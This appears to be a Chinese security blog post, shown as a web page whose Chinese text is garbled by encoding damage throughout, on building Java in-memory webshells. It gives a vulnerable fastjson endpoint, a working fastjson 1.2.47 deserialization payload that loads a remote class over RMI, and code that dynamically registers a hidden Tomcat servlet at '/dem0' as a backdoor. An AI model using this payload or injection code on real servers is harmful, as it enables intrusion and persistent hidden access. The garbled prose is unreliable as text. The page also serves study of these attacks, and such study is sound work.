<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>JAVAå†…å­˜é©¬æ”»å‡»ç¯‡ | Dem0ã®blog</title><meta name="keywords" content="JAVAå®‰å…¨, memshell"><meta name="author" content="Dem0"><meta name="copyright" content="Dem0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="JAVAå†…å­˜é©¬å†…å­˜é©¬çš„æ”»å‡»é¢webshellå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§webæœåŠ¡ï¼Œé‚£ä¹ˆä»åˆ›å»ºwebæœåŠ¡çš„è§’åº¦è€ƒè™‘ï¼Œè‡ªé¡¶å‘ä¸‹ï¼Œæœ‰ä¸‹é¢å‡ ç§æ‰‹æ®µå’Œæ€è·¯ï¼š  åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ interceptor&#x2F;controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring&#x2F;struts2&#x2F;jfinalï¼‰ åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ ä½¿ç”¨è´£ä»»é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVAå†…å­˜é©¬æ”»å‡»ç¯‡">
<meta property="og:url" content="https://dem0dem0.top/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/index.html">
<meta property="og:site_name" content="Dem0ã®blog">
<meta property="og:description" content="JAVAå†…å­˜é©¬å†…å­˜é©¬çš„æ”»å‡»é¢webshellå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§webæœåŠ¡ï¼Œé‚£ä¹ˆä»åˆ›å»ºwebæœåŠ¡çš„è§’åº¦è€ƒè™‘ï¼Œè‡ªé¡¶å‘ä¸‹ï¼Œæœ‰ä¸‹é¢å‡ ç§æ‰‹æ®µå’Œæ€è·¯ï¼š  åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ interceptor&#x2F;controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring&#x2F;struts2&#x2F;jfinalï¼‰ åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ ä½¿ç”¨è´£ä»»é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dem0dem0.top/img/cover4.png">
<meta property="article:published_time" content="2022-07-17T16:10:18.000Z">
<meta property="article:modified_time" content="2022-07-17T16:12:27.256Z">
<meta property="article:author" content="Dem0">
<meta property="article:tag" content="JAVAå®‰å…¨, memshell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dem0dem0.top/img/cover4.png"><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&nk=79475432&s=640"><link rel="canonical" href="https://dem0dem0.top/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'JAVAå†…å­˜é©¬æ”»å‡»ç¯‡',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-07-18 00:12:27'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dem0ã®blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover4.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Dem0ã®blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JAVAå†…å­˜é©¬æ”»å‡»ç¯‡</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-07-17T16:10:18.000Z" title="å‘è¡¨äº 2022-07-18 00:10:18">2022-07-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2022-07-17T16:12:27.256Z" title="æ›´æ–°äº 2022-07-18 00:12:27">2022-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">javaå®‰å…¨</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>11åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="JAVAå†…å­˜é©¬æ”»å‡»ç¯‡"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="JAVAå†…å­˜é©¬"><a href="#JAVAå†…å­˜é©¬" class="headerlink" title="JAVAå†…å­˜é©¬"></a>JAVAå†…å­˜é©¬</h1><h2 id="å†…å­˜é©¬çš„æ”»å‡»é¢"><a href="#å†…å­˜é©¬çš„æ”»å‡»é¢" class="headerlink" title="å†…å­˜é©¬çš„æ”»å‡»é¢"></a>å†…å­˜é©¬çš„æ”»å‡»é¢</h2><p>webshellå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§webæœåŠ¡ï¼Œé‚£ä¹ˆä»åˆ›å»ºwebæœåŠ¡çš„è§’åº¦è€ƒè™‘ï¼Œè‡ªé¡¶å‘ä¸‹ï¼Œæœ‰ä¸‹é¢å‡ ç§æ‰‹æ®µå’Œæ€è·¯ï¼š</p>
<ol>
<li>åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ interceptor&#x2F;controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring&#x2F;struts2&#x2F;jfinalï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ ä½¿ç”¨<code>è´£ä»»é“¾è®¾è®¡æ¨¡å¼</code>çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline &amp; Valveï¼ŒGrizzly çš„ FilterChain &amp; Filter ç­‰ç­‰ï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ servlet-api çš„å…·ä½“å®ç° servlet&#x2F;filter&#x2F;listener</li>
<li>åŠ¨æ€æ³¨å†Œ&#x2F;å­—èŠ‚ç æ›¿æ¢ä¸€äº›å®šæ—¶ä»»åŠ¡çš„å…·ä½“å®ç°ï¼Œæ¯”å¦‚ TimeTaskç­‰</li>
</ol>
<p>å¦å¤–ï¼Œæ¢ä¸€ä¸ªè§’åº¦æ¥è¯´ï¼Œwebshellä½œä¸ºä¸€ä¸ªåé—¨ï¼Œå®é™…ä¸Šæˆ‘ä»¬éœ€è¦ä»–å®Œæˆçš„å·¥ä½œæ˜¯èƒ½æ¥æ”¶åˆ°æ¶æ„è¾“å…¥ï¼Œæ‰§è¡Œæ¶æ„è¾“å…¥å¹¶å›æ˜¾ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹ï¼Œæ— é™å¾ªç¯ç­‰å¾…æ¶æ„è¾“å…¥å¹¶æ‰§è¡Œä»£ç æ¥ä½œä¸ºä¸€ä¸ªåé—¨ã€‚</p>
<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><blockquote>
<p>jdk 8u102<br>springboot 2.5.5 (Tomcat embedded)<br>fastjson 1.2.47</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vuljson</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vulJson</span><span class="params">(<span class="meta">@RequestBody</span> String input)</span>&#123;</span><br><span class="line">        System.out.println(input);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parseObject(input);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Successed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/badNameClass&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œæˆªå›¾</p>
<p><img src="https://img.dem0dem0.top/images/image-20220710095401938.png" alt="image-20220710095401938"></p>
<h2 id="Tomcat-åŠ¨æ€æ³¨å†Œ"><a href="#Tomcat-åŠ¨æ€æ³¨å†Œ" class="headerlink" title="Tomcat åŠ¨æ€æ³¨å†Œ"></a>Tomcat åŠ¨æ€æ³¨å†Œ</h2><h3 id="åŠ¨æ€æ³¨å…¥Servlet"><a href="#åŠ¨æ€æ³¨å…¥Servlet" class="headerlink" title="åŠ¨æ€æ³¨å…¥Servlet"></a>åŠ¨æ€æ³¨å…¥Servlet</h3><p>java webä¸­çš„<code>servlet+Filter+Listener</code>çš„æ³¨å†Œæ–¹å¼</p>
<ul>
<li>xmlæ–‡ä»¶æ³¨å†Œ</li>
<li>æ³¨è§£æ³¨å†Œ(Servlet 3.0+)</li>
<li>ServletContextåŠ¨æ€æ³¨å†Œ</li>
</ul>
<p>é¦–å…ˆä¸€èµ·æ¥çœ‹çœ‹ServletContextçš„æ–¹æ³•<code>addServlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> javax.servlet.ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, String servletClass, Servlet servlet, Map&lt;String, String&gt; initParams)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="keyword">if</span> (servletName != <span class="literal">null</span> &amp;&amp; !servletName.equals(<span class="string">&quot;&quot;</span>)) &#123;<span class="comment">//servletNameä¸ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="comment">//åˆ¤æ–­å½“å‰ç¨‹åºçš„çŠ¶æ€</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(<span class="string">&quot;applicationContext.addServlet.ise&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="built_in">this</span>.getContextPath()&#125;));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper)<span class="built_in">this</span>.context.findChild(servletName);</span><br><span class="line">            <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;<span class="comment">//åˆ¤æ–­æ˜¯å¦å·²ç»æ³¨å†Œäº†</span></span><br><span class="line">                wrapper = <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line">                wrapper.setName(servletName</span><br><span class="line">                <span class="built_in">this</span>.context.addChild(wrapper);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (wrapper.getName() != <span class="literal">null</span> &amp;&amp; wrapper.getServletClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!wrapper.isOverridable()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setOverridable(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletSecurity</span> <span class="variable">annotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setServletClass(servletClass);</span><br><span class="line">                Class&lt;?&gt; clazz = Introspection.loadClass(<span class="built_in">this</span>.context, servletClass);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    annotation = (ServletSecurity)clazz.getAnnotation(ServletSecurity.class);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">                    annotation = (ServletSecurity)servlet.getClass().getAnnotation(ServletSecurity.class);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (initParams != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Iterator</span> <span class="variable">var9</span> <span class="operator">=</span> initParams.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(var9.hasNext()) &#123;</span><br><span class="line">                    Entry&lt;String, String&gt; initParam = (Entry)var9.next();</span><br><span class="line">                    wrapper.addInitParameter((String)initParam.getKey(), (String)initParam.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            javax.servlet.ServletRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationServletRegistration</span>(wrapper, <span class="built_in">this</span>.context);</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                registration.setServletSecurity(<span class="keyword">new</span> <span class="title class_">ServletSecurityElement</span>(annotation));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> registration;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;applicationContext.invalidServletName&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;servletName&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†ä¸Šé¢çš„ä»£ç ç®€åŒ–æŠ½è±¡å‡ºæ¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String servletName=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper)<span class="built_in">this</span>.context.findChild(servletName);</span><br><span class="line"><span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line"> wrapper = <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line"> wrapper.setName(servletName);</span><br><span class="line"> <span class="built_in">this</span>.context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">wrapper.setServlet(servlet);</span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);<span class="comment">//Set the load-on-startup order value </span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å¦‚æœç›´æ¥æŠŠä¸Šè¯‰çš„ä»£ç ç›´æ¥è¿è¡Œï¼Œåœ¨ä¸€æ¬¡è®¿é—®åˆ°è¾¾ Tomcat æ—¶ï¼Œæ˜¯å¦‚ä½•åŒ¹é…åˆ°å…·ä½“çš„ Servlet çš„ï¼Ÿ</p>
<ul>
<li>ApplicationServletRegistration çš„ <code>addMapping</code> æ–¹æ³•è°ƒç”¨ <code>StandardContext#addServletMapping</code> æ–¹æ³•ï¼Œåœ¨ mapper ä¸­æ·»åŠ  URL è·¯å¾„ä¸ Wrapper å¯¹è±¡çš„æ˜ å°„ï¼ˆWrapper é€šè¿‡ this.children ä¸­æ ¹æ® name è·å–ï¼‰</li>
<li>åŒæ—¶åœ¨ servletMappings ä¸­æ·»åŠ  URL è·¯å¾„ä¸ name çš„æ˜ å°„ã€‚</li>
</ul>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨ä»£ç ä¸­æ·»åŠ ä¸‹é¢å‡ å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this.context.addServletMapping(&quot;/dem0&quot;, servletName);</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬æµç¨‹:</p>
<ol>
<li>è·å– ServletContext</li>
<li>è·å– Tomcat å¯¹åº”çš„ StandardContext</li>
<li>æ„å»ºæ–° servlet warpper</li>
<li>å°†æ„å»ºå¥½çš„ warpper æ·»åŠ åˆ° standardContext ä¸­ï¼Œå¹¶åŠ å…¥ servletMappings</li>
</ol>
<p>å¸¸è§çš„Context</p>
<p><img src="https://img.dem0dem0.top/images/640" alt="å›¾ç‰‡"></p>
<ul>
<li><p><strong>WebApplicationContext:</strong> å…¶å®è¿™ä¸ªæ¥å£å…¶å®æ˜¯SpringFramework ApplicationContextæ¥å£çš„ä¸€ä¸ªå­æ¥å£ï¼Œå¯¹åº”ç€æˆ‘ä»¬çš„webåº”ç”¨ã€‚å®ƒåœ¨ApplicationContextçš„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†å¯¹ServletContextçš„å¼•ç”¨ï¼Œå³getServletContextæ–¹æ³•ã€‚å› æ­¤åœ¨æ³¨å…¥å†…å­˜é©¬çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥æ‹¿åˆ°ServletContextã€‚</p>
</li>
<li><p><strong>ServeltContext:</strong> è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¯´çš„servlet-apiç»™çš„è§„èŒƒservletç”¨æ¥ä¸å®¹å™¨é—´è¿›è¡Œäº¤äº’çš„æ¥å£çš„ç»„åˆï¼Œè¿™ä¸ªæ¥å£å®šä¹‰äº†ä¸€ç³»åˆ—çš„æ–¹æ³•æ¥æè¿°ä¸Šä¸‹æ–‡ï¼ˆCotextï¼‰ï¼Œservleté€šè¿‡è¿™äº›æ–¹æ³•å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä¸è‡ªå·±æ‰€åœ¨çš„å®¹å™¨è¿›è¡Œä¸€äº›äº¤äº’ï¼Œæ¯”å¦‚é€šè¿‡getMajorVersionä¸getMinorVersionæ¥è·å–å®¹å™¨çš„ç‰ˆæœ¬ä¿¡æ¯ç­‰ã€‚(åº”ç”¨åˆå§‹åŒ–æ—¶ä½¿ç”¨)</p>
</li>
<li><p><strong>StandardContext:</strong> è¿™ä¸ªæ˜¯tomcatä¸­é—´ä»¶å¯¹servletè§„èŒƒä¸­servletContextçš„å®ç°ï¼Œåœ¨ä¹‹å‰çš„tomcatæ¶æ„å›¾ä¸­å¯ä»¥çœ‹åˆ°ä»–çš„ä½œç”¨ä½ç½®ï¼Œç”¨æ¥ç®¡ç†Wrapperã€‚</p>
</li>
</ul>
<blockquote>
<p>å¦‚ä½•è·å–ServletContext&#x2F;StandardContextï¼Ÿ</p>
<ul>
<li>é€šè¿‡è·å–ä¸Šä¸‹æ–‡çš„httpè¯·æ±‚ä¿¡æ¯æ¥è·å¾—servletContextï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­å°±æ˜¯é€šè¿‡ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()æ‰¾åˆ°äº†WebApplicationContextï¼Œè¿›è€Œæ‰¾åˆ°äº†ServletContextã€‚</li>
<li>é€šè¿‡åœ¨tocmcatå¯åŠ¨çš„httpçº¿ç¨‹ä¸­éå†æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚æ®tomcatçš„æ¶æ„æˆ‘ä»¬å¯ä»¥è‡ªé¡¶å‘ä¸‹æ‰¾åˆ°çº¿ç¨‹å¯¹åº”çš„servletContextã€‚bitterzå¸ˆå‚…ç»™å‡ºäº†ä¸€æ¡tomcatå…¨ç‰ˆæœ¬çš„åˆ©ç”¨é“¾</li>
</ul>
</blockquote>
<h3 id="åŠ¨æ€æ³¨å…¥Filter"><a href="#åŠ¨æ€æ³¨å…¥Filter" class="headerlink" title="åŠ¨æ€æ³¨å…¥Filter"></a>åŠ¨æ€æ³¨å…¥Filter</h3><p>Filter:è¿‡æ»¤å™¨ï¼Œæ˜¯java-webä¸­å¸¸ç”¨çš„æŠ€æœ¯ï¼Œé€šå¸¸ç”¨æ¥å¤„ç†<code>é™æ€webèµ„æº</code>ï¼Œ<code>è®¿é—®æƒé™æ§åˆ¶</code>,<code>è®°å½•æ—¥å¿—</code>.ä¸€èˆ¬ä¸€æ¬¡è¯·æ±‚åˆ°æœåŠ¡å™¨ä¸­ï¼Œå…ˆç”±filterå¯¹ç”¨æˆ·è¯·æ±‚ç»§ç»­å®é¢„å¤„ç†ï¼Œå†äº¤ç»™servlet.</p>
